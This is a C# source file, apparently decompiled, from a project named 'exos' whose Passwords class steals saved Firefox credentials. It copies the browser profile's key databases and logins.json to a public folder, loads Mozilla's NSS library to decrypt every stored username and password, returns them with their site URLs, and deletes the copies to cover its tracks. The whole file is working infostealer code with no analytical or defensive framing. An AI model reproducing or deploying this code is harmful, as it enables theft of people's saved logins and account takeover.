using System;
using System.Collections.Generic;
using System.IO;

namespace exos.Passwords;

internal class Passwords
{
	private static string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

	private static string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");

	private static string[] RequiredFiles = new string[4] { "key3.db", "key4.db", "logins.json", "cert9.db" };

	private static string CopyRequiredFiles(string profile)
	{
		string name = new DirectoryInfo(profile).Name;
		string text = Path.Combine(CopyTempPath, name);
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		string[] requiredFiles = RequiredFiles;
		foreach (string path in requiredFiles)
		{
			try
			{
				string text2 = Path.Combine(profile, path);
				if (File.Exists(text2))
				{
					File.Copy(text2, Path.Combine(text, Path.GetFileName(text2)));
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
				return null;
			}
		}
		return Path.Combine(CopyTempPath, name);
	}

	public static List<Password> Get(string BrowserDir)
	{
		List<Password> list = new List<Password>();
		string profile = Profile.GetProfile(BrowserDir);
		if (profile == null)
		{
			return list;
		}
		string mozillaPath = Profile.GetMozillaPath();
		if (mozillaPath == null)
		{
			return list;
		}
		string text = CopyRequiredFiles(profile);
		if (text == null)
		{
			return list;
		}
		Json json = new Json(File.ReadAllText(Path.Combine(text, "logins.json")));
		json.Remove(new string[2] { ",\"logins\":\\[", ",\"potentiallyVulnerablePasswords\"" });
		string[] array = json.SplitData();
		if (Decryptor.LoadNSS(mozillaPath))
		{
			if (!Decryptor.SetProfile(text))
			{
				Console.WriteLine("Failed to set profile!");
			}
			string[] array2 = array;
			foreach (string data in array2)
			{
				Password item = default(Password);
				Json json2 = new Json(data);
				string value = json2.GetValue("hostname");
				string value2 = json2.GetValue("encryptedUsername");
				string value3 = json2.GetValue("encryptedPassword");
				if (!string.IsNullOrEmpty(value3))
				{
					item.sUrl = value;
					item.sUsername = Decryptor.DecryptPassword(value2);
					item.sPassword = Decryptor.DecryptPassword(value3);
					list.Add(item);
				}
			}
			Decryptor.UnLoadNSS();
		}
		Directory.Delete(text, recursive: true);
		return list;
	}
}
